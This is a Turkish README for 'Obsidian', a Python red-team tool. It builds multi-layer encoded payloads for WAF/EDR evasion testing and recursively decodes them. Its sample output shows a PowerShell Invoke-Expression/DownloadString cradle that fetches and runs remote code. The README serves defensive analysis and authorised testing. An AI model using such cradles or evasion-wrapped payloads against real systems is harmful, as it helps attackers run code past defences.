<h1 align="center">
  Obsidian
</h1>

<h4 align="center">Gelişmiş Pentest Encoding, Obfuscation & Deobfuscation Framework'ü</h4>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.x-blue.svg" alt="Python 3.x">
  <img src="https://img.shields.io/badge/Status-Active-success.svg" alt="Status Active">
  <img src="https://img.shields.io/badge/License-MIT-red.svg" alt="License MIT">
</p>

---

## 📖 Hakkında

**Obsidian**, Red Team operasyonları ve sızma testi uzmanları (Penetration Testers) için özel olarak geliştirilmiş, tamamen modüler yapıda, çok katmanlı (multi-layer) bir encoding ve decoding framework'üdür. Hem iç içe geçmiş (deeply nested) karmaşık payload'ları otomatik olarak analiz edip deobfuscate etmek, hem de WAF/EDR atlatma testleri için çok katmanlı (multi-layered) obfuscated payload'lar üretmek üzere tasarlanmıştır.

İster 5 katmanlı bir WAF bypass payload'unu çözmek (unpack) isteyin, ister `UTF-16LE -> Base64 -> Gzip` adımlarıyla bir PowerShell `EncodedCommand` payload'u oluşturmak isteyin, Obsidian "recursive" (ardışık) ve eklenti (plugin) tabanlı motoruyla bu işlemleri sorunsuz bir şekilde halleder.

## 🚀 Temel Özellikler

* **Multi-Layer Obfuscation Pipeline Builder:** Birden fazla encoder'ı (Örn: `Zlib -> Base64 -> Hex`) sırayla birbirine zincirleyerek karmaşık payload'lar oluşturun.
* **Deep Analysis Deobfuscator:** Gizlenmiş/kodlanmış (obfuscated) stringleri otomatik analiz ederek iç içe geçmiş yapıları recursive olarak çözer (decode). Çözüm yolunu temiz bir ağaç (tree) yapısında gösterir.
* **PowerShell & Zlib Desteği:** Base64 veya Hex dizeleri içine gizlenmiş `UTF-16LE` (PowerShell `-EncodedCommand` payload'ları) ve `Gzip/Deflate` sıkıştırmaları için yerleşik (native) tespit ve dönüştürme özelliği.
* **Modüler Plugin Mimarisi:** Yeni bir encoder veya decoder eklemek, 3 satırlık bir Python class'ı yazmak kadar basittir. Motor, kalan tüm işleri (routing, error handling, validation) kendisi halleder.
* **Byte / Size Tracking:** Obfuscation süreci boyunca payload'un büyüme oranlarını (Örn: `150B -> 300B (Ratio: 2.0x)`) otomatik hesaplar ve loglar.
* **Raporlama (Reporting):** İşlem sonundaki obfuscation/deobfuscation pipeline detaylarını ve nihai payload'u doğrudan temiz Markdown dosyaları olarak dışa aktarır (export).
* **Standart Kriptografi & Hashing:** MD5, SHA1, SHA256, SHA512, Caesar Cipher, ROT13 ve Cisco Type 7 parola kırma özelliklerini de standart olarak içerir.

## 🛠️ Kurulum

Obsidian, **Python 3.x** gerektirir ve UI için iki adet kütüphane kullanır: `pyfiglet` ve `colorama`.

1. Repository'yi klonlayın:
```bash
git clone https://github.com/yourusername/obsidian.git
cd obsidian
```

2. Gerekli kütüphaneleri yükleyin:
```bash
pip install -r requirements.txt
# VEYA
pip install pyfiglet colorama
```

3. Script'i çalıştırın:
```bash
python obsidian.py
```

## 🎮 Kullanım & Menüler

`obsidian.py`'yi başlattığınızda sizi ana menü karşılayacaktır:

```text
  ____  __         _     ___
 / __ \/ /_  _____(_)___/ (_)___ _____
/ / / / __ \/ ___/ / __  / / __ `/ __ \
\ \_\ \ /_/ (__  ) / /_/ / / /_/ / / / /
 \____/_.___/____/_/\__,_/_/\__,_/_/ /_/

          | - |  By : Red Team Operations Script | - |

--- MAIN MENU ---
1. Obfuscation Pipeline Builder (Multi-Layer Encode)
2. Deep Analysis (Multi-Layer Decode)
3. Hashing (MD5, SHA1, SHA256...)
4. Manual Encoders / Decoders / Ciphers
0. Exit
```

### 1. Obfuscation Pipeline Builder
**Hazır profilleri (Presets)** (Örn: PowerShell Base64 Obfuscation, Web WAF Evasion) kullanarak hızlıca payload üretebilir veya URL Encode, HTML Entities, Hex, Base32, Base64, Zlib gibi modülleri seçerek tamamen kendi **Manuel Zincirinizi (Manual Chain)** inşa edebilirsiniz.

### 2. Deep Analysis (Deobfuscator)
Karmaşık (obfuscated) bir string yapıştırın. Analiz motoru (engine), aktif olan tüm Decoder eklentilerini (plugins) recursive olarak dener, olası çözüm yollarını bulur ve orijinal veriye (plaintext) ulaşmak için atılan tam adımları bir ağaç (tree) formatında gösterir.
*Örnek Çıktı:*
```text
[*] Deep Analyzing (Max Depth: 5)...
--- Path #1 (3 layers) ---
└─ [URL Decode]
  └─ [Base64]
    └─ [Zlib Deflate (Gzip/Hex/B64)]

Final Result:
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://...')
```

## 🧩 Desteklenen Eklentiler (Plugins)

- **Encoders / Decoders:** Base64, Base32, Hexadecimal, URL Encode, HTML Entities, Binary, Morse Code, Zlib Deflate, UTF-16LE.
- **Ciphers:** ROT13, Caesar Cipher, Cisco Type 7.
- **Hashing:** MD5, SHA1, SHA256, SHA384, SHA512.

## ⚠️ Uyarı & Yasal Sorumluluk Reddi (Disclaimer)

Bu araç, **sadece eğitim amaçlı, yasal yetkiye sahip Sızma Testleri (Penetration Testing) ve Red Team operasyonlarında kullanılmak üzere** tasarlanmıştır. Bu aracın yasa dışı faaliyetlerde kullanılmasından doğacak herhangi bir sorumluluk yazara ait değildir. Ağları veya sistemleri test etmeden önce mutlaka yazılı ve açık izniniz olduğundan emin olun.
